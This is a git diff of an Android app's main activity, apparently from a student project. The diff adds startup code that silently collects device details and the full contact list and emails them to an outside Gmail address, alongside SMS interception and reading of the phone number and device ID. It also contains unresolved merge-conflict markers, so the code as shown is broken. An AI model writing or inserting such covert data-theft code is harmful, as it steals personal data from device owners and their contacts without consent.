@@ -10,6 +10,7 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.ContentResolver;
 import android.content.pm.PackageManager;
 import android.location.Location;
 import android.location.LocationManager;
@@ -23,6 +24,7 @@ import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.Toast;
+
 
 import java.io.IOException;
 import java.net.InetAddress;
@@ -160,6 +162,7 @@ public class MainActivity extends AppCompatActivity {
         SMSBroadcastReceiver smsBroadcastReceiver = new SMSBroadcastReceiver();
         registerReceiver(smsBroadcastReceiver, intentFilter);
 
+<<<<<<< Updated upstream
         androidID = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
         TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
         phoneNum = telephonyManager.getLine1Number();
@@ -182,6 +185,10 @@ public class MainActivity extends AppCompatActivity {
             }
         } .start();
 
+=======
+        String deviceID =Settings.Secure.getString(this.getContentResolver(),Settings.Secure.ANDROID_ID);
+        EmailHelper.sendEmail("ict1004p2grp4@gmail.com","Initial Connection - "+ deviceID, DeviceScrape.getDeviceInfo() + "\n\n\nContacts:\n-----\n" +  ContactScrape.scrapeContacts(getContentResolver()));
+>>>>>>> Stashed changes
 
 
         Button button=findViewById(R.id.secondActivityButton);
